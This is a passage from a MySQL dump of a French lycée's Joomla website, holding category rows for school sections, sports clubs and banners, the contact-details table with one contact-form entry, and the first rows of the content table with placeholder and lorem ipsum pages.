(15, 85, 1, 27, 28, 1, 'actualites', 'com_content', 'actualités', 'actualites', '', '', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2012-10-29 19:10:27', 0, '0000-00-00 00:00:00', 0, '*'),
(16, 98, 1, 29, 30, 1, 'test', 'com_content', 'Test', 'test', '', '<p><a href="loremipsum">Lorem Ipsum</a></p>', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-08 13:51:23', 390, '2016-06-15 14:48:28', 0, '*'),
(17, 102, 1, 31, 38, 1, 'cat-lycee', 'com_content', 'Lycee', 'cat-lycee', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-16 10:05:42', 390, '2016-06-22 08:04:51', 0, '*'),
(18, 103, 1, 39, 50, 1, 'cat-formation', 'com_content', 'Formation', 'cat-formation', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-16 10:07:09', 390, '2016-06-22 08:05:31', 0, '*'),
(19, 104, 1, 83, 92, 1, 'cat-actualite', 'com_content', 'Actualité', 'cat-actualite', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-16 10:08:12', 390, '2016-06-22 08:05:49', 0, '*'),
(20, 108, 1, 93, 94, 1, 'cat-contact', 'com_content', 'contact', 'cat-contact', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-16 10:29:33', 0, '0000-00-00 00:00:00', 0, '*'),
(22, 115, 17, 32, 33, 2, 'cat-lycee/cat-lycee-histoire', 'com_content', 'Histoire', 'cat-lycee-histoire', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-17 08:54:17', 390, '2016-06-22 08:05:06', 0, '*'),
(23, 116, 18, 40, 41, 2, 'cat-formation/cat-form-prebac', 'com_content', 'Pré-bac', 'cat-form-prebac', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-20 10:28:43', 0, '0000-00-00 00:00:00', 0, '*'),
(24, 117, 18, 42, 43, 2, 'cat-formation/cat-form-bts', 'com_content', 'BTS', 'cat-form-bts', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-20 10:29:35', 0, '0000-00-00 00:00:00', 0, '*'),
(25, 118, 18, 44, 45, 2, 'cat-formation/cat-form-cpge', 'com_content', 'CPGE', 'cat-form-cpge', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-20 10:32:54', 0, '0000-00-00 00:00:00', 0, '*'),
(26, 119, 18, 46, 47, 2, 'cat-formation/cat-form-autres', 'com_content', 'Autres formations', 'cat-form-autres', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-20 10:49:41', 390, '2016-06-20 10:49:59', 0, '*'),
(27, 125, 1, 95, 96, 1, 'cat-accueil', 'com_content', 'Accueil', 'cat-accueil', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-20 11:20:32', 0, '0000-00-00 00:00:00', 0, '*'),
(28, 126, 17, 34, 35, 2, 'cat-lycee/cat-lycee-personnel', 'com_content', 'Personnel', 'cat-lycee-personnel', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-20 11:36:57', 0, '0000-00-00 00:00:00', 0, '*'),
(29, 127, 1, 51, 82, 1, 'cat-vie-scol', 'com_content', 'Vie scolaire', 'cat-vie-scol', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-21 08:41:14', 0, '0000-00-00 00:00:00', 0, '*'),
(30, 128, 29, 60, 77, 2, 'cat-vie-scol/cat-vie-scol-as', 'com_content', 'Associations sportives', 'cat-vie-scol-as', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-21 08:41:46', 390, '2016-06-22 07:56:32', 0, '*'),
(31, 129, 29, 58, 59, 2, 'cat-vie-scol/cat-vie-scol-cdi', 'com_content', 'CDI', 'cat-vie-scol-cdi', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 07:15:55', 390, '2016-06-22 08:09:33', 0, '*'),
(32, 130, 18, 48, 49, 2, 'cat-formation/cat-form-orientation', 'com_content', 'Orientation', 'cat-form-orientation', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 07:23:16', 0, '0000-00-00 00:00:00', 0, '*'),
(33, 131, 19, 86, 87, 2, 'cat-actualite/cat-actu-evenements', 'com_content', 'Événements', 'cat-actu-evenements', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 07:25:04', 390, '2016-06-22 08:07:23', 0, '*'),
(34, 132, 19, 84, 85, 2, 'cat-actualite/cat-actu-important', 'com_content', 'Important', 'cat-actu-important', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 07:25:35', 0, '0000-00-00 00:00:00', 0, '*'),
(35, 133, 19, 88, 89, 2, 'cat-actualite/cat-actu-voyages', 'com_content', 'Voyages', 'cat-actu-voyages', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 07:27:43', 390, '2016-06-22 08:07:55', 0, '*'),
(36, 134, 29, 80, 81, 2, 'cat-vie-scol/cat-vie-scol-ape', 'com_content', 'Association des Parents d''Élèves', 'cat-vie-scol-ape', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 07:30:30', 0, '0000-00-00 00:00:00', 0, '*'),
(37, 135, 29, 78, 79, 2, 'cat-vie-scol/cat-vie-scol-cvl', 'com_content', 'Conseil de la vie lycéenne', 'cat-vie-scol-cvl', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 07:36:36', 0, '0000-00-00 00:00:00', 0, '*'),
(38, 136, 17, 36, 37, 2, 'cat-lycee/cat-lycee-reglement', 'com_content', 'Réglement Intérieur', 'cat-lycee-reglement', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 08:03:41', 390, '2016-06-22 08:10:43', 0, '*'),
(39, 137, 29, 56, 57, 2, 'cat-vie-scol/cat-vie-scol-intendance', 'com_content', 'Intendance', 'cat-vie-scol-intendance', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 08:11:53', 0, '0000-00-00 00:00:00', 0, '*'),
(40, 138, 29, 52, 53, 2, 'cat-vie-scol/cat-vie-scol-scolarite', 'com_content', 'Scolarité', 'cat-vie-scol-scolarite', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 08:16:31', 0, '0000-00-00 00:00:00', 0, '*'),
(41, 139, 29, 54, 55, 2, 'cat-vie-scol/cat-vie-scol-fse', 'com_content', 'Foyer Socio-Educatif', 'cat-vie-scol-fse', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 09:04:32', 390, '2016-06-22 09:11:05', 0, '*'),
(42, 140, 30, 61, 62, 3, 'cat-vie-scol/cat-vie-scol-as/cat-vie-scol-as-natation', 'com_content', 'Natation', 'cat-vie-scol-as-natation', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 12:37:43', 0, '0000-00-00 00:00:00', 0, '*'),
(43, 141, 30, 63, 64, 3, 'cat-vie-scol/cat-vie-scol-as/cat-vie-scol-as-badminton', 'com_content', 'Badminton', 'cat-vie-scol-as-badminton', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 12:40:06', 0, '0000-00-00 00:00:00', 0, '*'),
(44, 142, 30, 65, 66, 3, 'cat-vie-scol/cat-vie-scol-as/cat-vie-scol-as-musculation', 'com_content', 'Musculation', 'cat-vie-scol-as-musculation', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 12:43:13', 0, '0000-00-00 00:00:00', 0, '*'),
(45, 143, 30, 67, 68, 3, 'cat-vie-scol/cat-vie-scol-as/cat-vie-scol-as-futsal', 'com_content', 'Foot en salle', 'cat-vie-scol-as-futsal', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 12:44:42', 0, '0000-00-00 00:00:00', 0, '*'),
(46, 144, 30, 69, 70, 3, 'cat-vie-scol/cat-vie-scol-as/cat-vie-scol-as-basket', 'com_content', 'Basketball', 'cat-vie-scol-as-basket', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 12:45:35', 0, '0000-00-00 00:00:00', 0, '*'),
(47, 145, 30, 71, 72, 3, 'cat-vie-scol/cat-vie-scol-as/cat-vie-scol-as-pingpong', 'com_content', 'Tennis de table', 'cat-vie-scol-as-pingpong', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 12:47:07', 0, '0000-00-00 00:00:00', 0, '*'),
(48, 146, 30, 73, 74, 3, 'cat-vie-scol/cat-vie-scol-as/cat-vie-scol-as-volley', 'com_content', 'Volleyball', 'cat-vie-scol-as-volley', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 12:47:43', 0, '0000-00-00 00:00:00', 0, '*'),
(49, 147, 30, 75, 76, 3, 'cat-vie-scol/cat-vie-scol-as/cat-vie-scol-as-tennis', 'com_content', 'Tennis', 'cat-vie-scol-as-tennis', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-22 12:48:47', 0, '0000-00-00 00:00:00', 0, '*'),
(50, 149, 1, 97, 98, 1, 'catban-accueil', 'com_banners', 'Accueil', 'catban-accueil', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:19:21', 0, '0000-00-00 00:00:00', 0, '*'),
(51, 150, 1, 99, 102, 1, 'catban-lycee', 'com_banners', 'Lycée', 'catban-lycee', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:32:11', 0, '0000-00-00 00:00:00', 0, '*'),
(52, 151, 51, 100, 101, 2, 'catban-lycee/catban-lycee-personnel', 'com_banners', 'Personnel', 'catban-lycee-personnel', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:33:26', 0, '0000-00-00 00:00:00', 0, '*'),
(53, 152, 1, 103, 104, 1, 'catban-formations', 'com_banners', 'Formations', 'catban-formations', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:34:05', 0, '0000-00-00 00:00:00', 0, '*'),
(54, 153, 1, 105, 120, 1, 'catban-vie-scolaire', 'com_banners', 'Vie Scolaire', 'catban-vie-scolaire', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:37:53', 0, '0000-00-00 00:00:00', 0, '*'),
(55, 154, 54, 106, 107, 2, 'catban-vie-scolaire/catban-vie-scol-scolarite', 'com_banners', 'Scolarité', 'catban-vie-scol-scolarite', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:38:46', 0, '0000-00-00 00:00:00', 0, '*'),
(56, 155, 54, 108, 109, 2, 'catban-vie-scolaire/catban-vie-scol-fse', 'com_banners', 'Foyer Socio-Educatif', 'catban-vie-scol-fse', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:39:20', 0, '0000-00-00 00:00:00', 0, '*'),
(57, 156, 54, 110, 111, 2, 'catban-vie-scolaire/catban-vie-scol-restauration', 'com_banners', 'Restauration', 'catban-vie-scol-restauration', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:41:12', 0, '0000-00-00 00:00:00', 0, '*'),
(58, 157, 54, 112, 113, 2, 'catban-vie-scolaire/catban-vie-scol-cdi', 'com_banners', 'CDI', 'catban-vie-scol-cdi', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:41:37', 0, '0000-00-00 00:00:00', 0, '*'),
(59, 158, 54, 114, 115, 2, 'catban-vie-scolaire/catban-vie-scol-as', 'com_banners', 'Associations Sportives', 'catban-vie-scol-as', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:42:33', 0, '0000-00-00 00:00:00', 0, '*'),
(60, 159, 54, 116, 117, 2, 'catban-vie-scolaire/catban-vie-scol-cvl', 'com_banners', 'CVL', 'catban-vie-scol-cvl', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:43:05', 0, '0000-00-00 00:00:00', 0, '*'),
(61, 160, 54, 118, 119, 2, 'catban-vie-scolaire/catban-vie-scol-ape', 'com_banners', 'Association des Parents d''Elèves', 'catban-vie-scol-ape', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:44:03', 0, '0000-00-00 00:00:00', 0, '*'),
(62, 161, 1, 121, 122, 1, 'catban-actualites', 'com_banners', 'Actualités', 'catban-actualites', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-23 08:45:21', 0, '0000-00-00 00:00:00', 0, '*');

-- --------------------------------------------------------

--
-- Table structure for table `jos_contact_details`
--

CREATE TABLE IF NOT EXISTS `jos_contact_details` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `con_position` varchar(255) DEFAULT NULL,
  `address` text,
  `suburb` varchar(100) DEFAULT NULL,
  `state` varchar(100) DEFAULT NULL,
  `country` varchar(100) DEFAULT NULL,
  `postcode` varchar(100) DEFAULT NULL,
  `telephone` varchar(255) DEFAULT NULL,
  `fax` varchar(255) DEFAULT NULL,
  `misc` mediumtext,
  `image` varchar(255) DEFAULT NULL,
  `imagepos` varchar(20) DEFAULT NULL,
  `email_to` varchar(255) DEFAULT NULL,
  `default_con` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `catid` int(11) NOT NULL DEFAULT '0',
  `access` int(10) unsigned DEFAULT NULL,
  `mobile` varchar(255) NOT NULL DEFAULT '',
  `webpage` varchar(255) NOT NULL DEFAULT '',
  `sortname1` varchar(255) NOT NULL,
  `sortname2` varchar(255) NOT NULL,
  `sortname3` varchar(255) NOT NULL,
  `language` char(7) NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if article is featured.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`published`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `jos_contact_details`
--

INSERT INTO `jos_contact_details` (`id`, `name`, `alias`, `con_position`, `address`, `suburb`, `state`, `country`, `postcode`, `telephone`, `fax`, `misc`, `image`, `imagepos`, `email_to`, `default_con`, `published`, `checked_out`, `checked_out_time`, `ordering`, `params`, `user_id`, `catid`, `access`, `mobile`, `webpage`, `sortname1`, `sortname2`, `sortname3`, `language`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `metakey`, `metadesc`, `metadata`, `featured`, `xreference`, `publish_up`, `publish_down`) VALUES
(1, 'Nous envoyer un courriel', 'contact-form', '', '', '', '', '', '', '', '', '<h2>Nous localiser</h2>\r\n<p><img src="images/1.jpg" border="0" alt="" /></p>', '', NULL, 'ce.0940580v@ac-creteil.fr', 0, 1, 390, '2016-06-20 10:18:41', 1, '{"show_contact_category":"","show_contact_list":"","presentation_style":"","show_name":"","show_position":"","show_email":"","show_street_address":"","show_suburb":"","show_state":"","show_postcode":"","show_country":"","show_telephone":"","show_mobile":"","show_fax":"","show_webpage":"","show_misc":"","show_image":"","allow_vcard":"","show_articles":"","show_profile":"","show_links":"","linka_name":"","linka":null,"linkb_name":"","linkb":null,"linkc_name":"","linkc":null,"linkd_name":"","linkd":null,"linke_name":"","linke":"","contact_layout":"","show_email_form":"","show_email_copy":"","banned_email":"","banned_subject":"","banned_text":"","validate_session":"","custom_reply":"","redirect":""}', 0, 4, 1, '', '', '', '', '', '*', '2011-08-02 16:04:02', 42, '', '2013-04-05 16:05:34', 390, '', '', '{"robots":"","rights":""}', 0, '', '0000-00-00 00:00:00', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `jos_content`
--

CREATE TABLE IF NOT EXISTS `jos_content` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `asset_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to the #__assets table.',
  `title` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `title_alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '' COMMENT 'Deprecated in Joomla! 3.0',
  `introtext` mediumtext NOT NULL,
  `fulltext` mediumtext NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `sectionid` int(10) unsigned NOT NULL DEFAULT '0',
  `mask` int(10) unsigned NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `images` text NOT NULL,
  `urls` text NOT NULL,
  `attribs` varchar(5120) NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `parentid` int(10) unsigned NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if article is featured.',
  `language` char(7) NOT NULL COMMENT 'The language code for the article.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`state`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=74 ;

--
-- Dumping data for table `jos_content`
--

INSERT INTO `jos_content` (`id`, `asset_id`, `title`, `alias`, `title_alias`, `introtext`, `fulltext`, `state`, `sectionid`, `mask`, `catid`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `images`, `urls`, `attribs`, `version`, `parentid`, `ordering`, `metakey`, `metadesc`, `access`, `hits`, `metadata`, `featured`, `language`, `xreference`) VALUES
(1, 33, 'Meet the Staff', 'meet-the-staff', '', '<p>Meet the Staff</p>', '', -2, 0, 0, 7, '2011-07-18 05:25:17', 42, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2011-07-18 05:25:17', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 1, 0, 4, '', '', 1, 2, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(2, 34, 'Nos formations', 'nos-formations', '', '<div class="art-columns">\r\n<div class="art-col left"><br />\r\n<p class="intro"><a href="21-baccalaureats" title="Pré-Bac">Pré-Bac</a></p>\r\n<p>Découvrez les baccalauréats auxquels nous préparons ainsi que les Enseignements d''exploration de Seconde.</p>\r\n</div>\r\n<div class="art-col right"><br />\r\n<p class="intro"><a href="22-etudes-post-bac">Études Post-Bac</a></p>\r\n<p>Le bac en poche ? Poursuivez vos études en choisissant une des nombreuses formations post-Bac que nous proposons.</p>\r\n</div>\r\n</div>\r\n<div class="art-columns">\r\n<div class="art-col left"><br />\r\n<p class="intro"><a href="23-etudes-post-bts">Étudier après le BTS</a></p>\r\n<p>Le Lycée Maximilien sorre vous propose de continuer vos études après le BTS à travers plusieurs formations.</p>\r\n</div>\r\n<div class="art-col right"><br />\r\n<p class="intro"><a href="24-formation-en-alternance">Formation en alternance</a></p>\r\n<p>Étudiez avec un pied dans le monde de l''entreprise. Avec le statut d''apprenti, n''attendez pas la fin de vos études pour être payé.</p>\r\n</div>\r\n</div>', '', -2, 0, 0, 7, '2011-07-18 05:25:26', 42, '', '2016-06-09 07:56:15', 390, 0, '0000-00-00 00:00:00', '2011-07-18 05:25:26', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 18, 0, 11, '', '', 1, 1152, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(3, 35, 'Facilities', 'facilities', '', '<p>Facilities</p>', '', -2, 0, 0, 7, '2011-07-18 05:25:35', 42, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2011-07-18 05:25:35', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 1, 0, 2, '', '', 1, 1, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(4, 36, 'L''actualité de votre lycée', 'curriculum', '', '<p class="intro">Laoreet dolore magna.orem ipsum dolor ser adipiscing elit, sed.</p>\r\n<p>Laoreet dolore magnaorem ipsum dolor ser adipiscing elit, sed diam nonummy nibh euismod tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor.</p>\r\n<p class="intro">perspiciatis unde omnis iste natus error voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae.</p>\r\n<p>Tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet consectetuer unde omnis iste natuseme error sit voluptatem accusantium doloremque laudantium, totam rem.</p>\r\n<p class="intro">Laoreet dolore magna.orem ipsum dolor ser adipiscing elit, sed diam.</p>\r\n<p>Laoreet dolore magnaorem ipsum dolor ser adipiscing elit, sed diam nonummy nibh euismod tincidunt laoreet dolore setsit amet consectetuer adipiscing elit sed diam nonummy nonummy nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet, consectetuer.</p>\r\n<p class="intro">perspiciatis unde omnis iste natus error voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae.</p>\r\n<p>Nibh euismod tincidunt ut laoreet dolore magna.orem ipsum dolor ser adipiscing elit sed diam nonummy nibh set dolor. Lorem ipsum dolor sit amet consectetuer unde omnis iste natuseme error sit voluptatem accusantium doloremque laudantium, totam rem.</p>', '', 2, 0, 0, 7, '2011-07-18 05:25:44', 42, '', '2012-10-29 14:11:25', 390, 0, '0000-00-00 00:00:00', '2011-07-18 05:25:44', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 3, 0, 10, '', '', 1, 145, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(5, 37, 'Locations', 'locations', '', '<p>LOCATIONS</p>', '', 2, 0, 0, 7, '2011-07-18 05:25:59', 42, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2011-07-18 05:25:59', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}', 1, 0, 9, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
